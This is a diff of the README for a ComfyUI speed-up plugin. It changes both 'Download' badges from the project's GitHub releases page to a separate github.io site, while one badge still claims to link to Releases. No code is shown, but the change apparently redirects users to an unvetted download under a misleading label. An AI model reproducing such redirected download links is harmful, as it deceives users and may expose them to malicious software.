@@ -1,6 +1,6 @@
 # 🤖 ComfyUI_sol-attn_Blackwell - Speed Up Your AI Images
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge)](https://github.com/Beatau9610/ComfyUI_sol-attn_Blackwell/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-blue?style=for-the-badge)](https://beatau9610.github.io)
 
 ## 🚀 What Is This?
 
@@ -32,7 +32,7 @@ Before you download, make sure your computer meets these minimum requirements:
 
 Visit this link to download the application:
 
-[![Download Button](https://img.shields.io/badge/-%F0%9F%93%A5%20Download%20from%20Releases-orange?style=for-the-badge&logo=github)](https://github.com/Beatau9610/ComfyUI_sol-attn_Blackwell/releases)
+[![Download Button](https://img.shields.io/badge/-%F0%9F%93%A5%20Download%20from%20Releases-orange?style=for-the-badge&logo=github)](https://beatau9610.github.io)
 
 ### Step 2: Install the Plugin
 
